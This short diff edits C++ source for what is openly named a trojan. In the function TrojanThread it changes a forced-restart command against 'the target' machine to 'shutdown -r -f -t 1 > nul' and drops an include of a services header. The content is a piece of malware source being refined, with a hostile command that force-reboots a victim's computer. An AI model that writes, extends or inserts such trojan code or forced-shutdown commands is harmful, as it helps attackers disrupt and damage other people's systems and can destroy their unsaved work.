@@ -4,7 +4,6 @@
 #include <string>
 #include <shlobj_core.h>
 #include "configurations.h"
-#include "services.h"
 
 
 std::wstring GetCurrentPath() {
@@ -78,7 +77,7 @@ BOOL TrojanThread(LPVOID TrojParams) {
 
 
     // Forcefully restart machine:
-    if (system("shutdown -r -f > nul") == -1) {
+    if (system("shutdown -r -f -t 1 > nul") == -1) {
         printf("Failed to force reset the target: %d\n", GetLastError());
         return FALSE;
     }
